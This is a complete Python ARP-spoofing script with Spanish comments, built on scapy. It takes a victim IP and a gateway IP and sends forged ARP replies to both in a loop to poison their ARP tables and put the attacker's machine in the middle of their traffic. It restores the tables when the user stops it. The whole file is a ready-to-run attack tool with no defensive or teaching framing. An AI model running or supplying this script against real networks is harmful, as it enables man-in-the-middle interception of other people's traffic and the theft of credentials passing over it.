#!/usr/bin/env python3

import argparse
import time
import sys
import scapy.all as scapy

def get_mac(ip):
    """Obtiene la dirección MAC de una IP usando ARP request."""
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[!] No se pudo obtener la MAC para {ip}")
        return None

def spoof(target_ip, spoof_ip):
    """Envía un paquete ARP falso para envenenar la tabla ARP."""
    target_mac = get_mac(target_ip)
    if not target_mac:
        return

    packet = scapy.ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    """Restaura la tabla ARP original."""
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if not destination_mac or not source_mac:
        return

    packet = scapy.ARP(op=2, pdst=destination_ip, psrc=source_ip, hwdst=destination_mac, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def main():
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument('-t', '--target', required=True, dest='target_ip', help='IP de la víctima')
    parser.add_argument('-g', '--gateway', required=True, dest='gateway_ip', help='IP del gateway/router')
    args = parser.parse_args()

    target_ip = args.target_ip
    gateway_ip = args.gateway_ip

    try:
        print(f"[*] Comenzando ARP Spoofing: {target_ip} <--> {gateway_ip}")
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Deteniendo ARP Spoofing. Restaurando tablas ARP...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[*] Tablas ARP restauradas.")

if __name__ == '__main__':
    main()